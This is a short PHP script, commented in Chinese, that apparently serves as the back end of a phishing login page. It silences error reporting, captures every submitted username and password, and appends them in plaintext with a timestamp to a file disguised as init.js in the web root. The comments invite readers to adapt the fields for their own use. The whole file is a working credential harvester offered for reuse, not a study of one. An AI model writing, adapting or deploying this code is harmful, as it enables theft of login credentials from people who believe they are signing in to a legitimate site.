<?php
error_reporting(0);
// 可以自己增加一些字段
$user = 'username=' .	$_REQUEST['username'];  
// 账号属性，自行修改
$password = 'password=' .	$_REQUEST['password'];  
//密码属性 ，自行修改
$num = strlen($user);
#echo $num;
//判断用户是否输入了用户名以及长度，我当时需要的是最少10个，否则不予保存
//(这里可以继续完善一下，对密码账号都作处理，trip空格以及特殊字符等)
if($num > 9){
  $root =  $_SERVER['DOCUMENT_ROOT'];
  $log_file = $root. "init.js";
  //定义密码保存的位置,这里是根目录下输出innit.js
  $error_log_str = date("Ymd h:i:s", time()). "\t$user"."\t$password"	;
  //保存的格式，大家可以根据我的日志文件增添减除
  $log_file_hand = fopen($log_file, 'a+');
  fwrite($log_file_hand, $error_log_str."\r\n");
  fclose($log_file_hand);
}
?>


